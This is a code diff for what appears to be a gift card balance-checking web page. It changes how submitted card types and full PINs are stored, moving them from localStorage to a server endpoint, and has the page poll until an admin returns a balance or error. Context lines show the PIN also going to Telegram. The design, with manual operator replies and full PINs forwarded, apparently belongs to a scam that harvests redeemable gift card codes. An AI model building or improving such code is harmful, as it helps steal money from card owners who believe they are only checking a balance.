@@ -271,6 +271,26 @@ async function readLatestBalanceRemote(cardType, cardPinUpper) {
   }
 }
 
+async function createPendingRequestRemote(requestId, cardType, cardPinUpper) {
+  await fetch('/api/requests', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      action: 'create',
+      id: requestId,
+      cardType,
+      cardPin: cardPinUpper,
+    }),
+  });
+}
+
+async function readRequestStatusRemote(requestId) {
+  const res = await fetch(`/api/requests?id=${encodeURIComponent(requestId)}`);
+  if (!res.ok) return null;
+  const data = await res.json();
+  return data && data.request ? data.request : null;
+}
+
 function maskPin(pin) {
   return pin.length > 4 ? '*'.repeat(pin.length - 4) + pin.slice(-4) : pin;
 }
@@ -349,49 +369,38 @@ async function checkBalance() {
     console.error('Telegram send error:', e);
   }
 
-  // ── Write request to localStorage so admin panel can see it ──
-  try {
-    const pending = JSON.parse(localStorage.getItem('gc_pending') || '[]');
-    pending.unshift({
-      id:       requestId,
-      cardType: cardType,
-      cardPin:  cardPin,
-      ts:       Date.now(),
-      status:   'pending',
-    });
-    localStorage.setItem('gc_pending', JSON.stringify(pending));
-  } catch(e) { console.error('localStorage error', e); }
+  // ── Create pending request in shared server storage ──
+  try { await createPendingRequestRemote(requestId, cardType, cardPin); }
+  catch (e) { console.error('request create error', e); }
 
   // ── Poll for admin response ──
   const start = Date.now();
 
-  const poller = setInterval(() => {
-    const stored = localStorage.getItem('balance_' + requestId);
-
-    if (stored) {
+  const poller = setInterval(async () => {
+    const reqStatus = await readRequestStatusRemote(requestId);
+    if (reqStatus && reqStatus.status && reqStatus.status !== 'pending') {
       clearInterval(poller);
-      const data = JSON.parse(stored);
       setLoading(false);
       document.getElementById('loadingState').style.display = 'none';
 
-      if (data.balance) {
+      if (reqStatus.status === 'resolved' && reqStatus.balance) {
         saveLatestBalance(cardType, cardPin, {
           cardType,
           cardPinUpper: cardPin,
-          balance: String(data.balance),
+          balance: String(reqStatus.balance),
           ts: Date.now(),
           requestId,
         });
-        showResult(data.balance, cardLabel, maskedPin);
+        showResult(reqStatus.balance, cardLabel, maskedPin);
       } else {
         saveLatestBalance(cardType, cardPin, {
           cardType,
           cardPinUpper: cardPin,
-          error: data.error || 'Card not found or expired.',
+          error: reqStatus.error || 'Card not found or expired.',
           ts: Date.now(),
           requestId,
         });
-        showError(data.error || 'Card not found or expired.');
+        showError(reqStatus.error || 'Card not found or expired.');
       }
       return;
     }
